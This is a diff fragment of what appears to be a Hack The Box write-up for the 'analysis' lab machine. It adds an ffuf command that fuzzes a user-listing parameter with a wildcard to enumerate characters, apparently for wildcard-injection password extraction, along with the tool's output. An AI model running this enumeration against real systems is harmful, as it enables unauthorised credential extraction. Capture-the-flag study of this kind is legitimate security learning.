@@ -240,6 +240,37 @@ This query shows the only users whos name begins with `a`
 To test this ill make a list of characters including lowercase, uppercase, numbers and symbols for the event i need to pull out a password
 
 ```python
+❯❯❯ ffuf -u http://internal.analysis.htb/users/list.php?name=FUZZ* -w chars.txt -fs 406
 
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.3.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=FUZZ*
+ :: Wordlist         : FUZZ: /home/kali/htb/analysis/chars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 406
+________________________________________________
+
+j                       [Status: 200, Size: 416, Words: 11, Lines: 1, Duration: 17ms]
+L                       [Status: 200, Size: 409, Words: 11, Lines: 1, Duration: 25ms]
+b                       [Status: 200, Size: 412, Words: 11, Lines: 1, Duration: 42ms]
+J                       [Status: 200, Size: 416, Words: 11, Lines: 1, Duration: 48ms]
+l                       [Status: 200, Size: 409, Words: 11, Lines: 1, Duration: 52ms]
+t                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 58ms]
+a                       [Status: 200, Size: 417, Words: 11, Lines: 1, Duration: 58ms]
+B                       [Status: 200, Size: 412, Words: 11, Lines: 1, Duration: 67ms]
+A                       [Status: 200, Size: 417, Words: 11, Lines: 1, Duration: 71ms]
 ```
 
